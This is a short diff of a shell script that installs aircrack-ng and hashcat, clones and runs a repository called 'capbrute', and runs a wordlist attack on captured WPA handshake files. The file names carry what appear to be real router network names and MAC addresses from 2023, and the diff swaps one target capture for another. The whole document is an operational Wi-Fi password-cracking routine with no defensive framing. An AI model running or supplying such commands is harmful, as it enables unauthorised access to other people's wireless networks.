@@ -1,6 +1,6 @@
 sudo apt-get update-y
 sudo apt install aircrack-ng python3 hashcat -y
 git clone https://github.com/JamalNiga/capbrute.git cap
-cd cap && ls -al
+cd cap
 python3 hy.py
-aircrack-ng -w *txt handshake_inwiHome4GA0F511_E2-9F-2E-11-F5-A2_2023-10-12T17-30-35.cap
+aircrack-ng -w *txt handshake_inwiHome4G054347_B0-73-5D-05-43-47_2023-10-16T14-04-26.cap
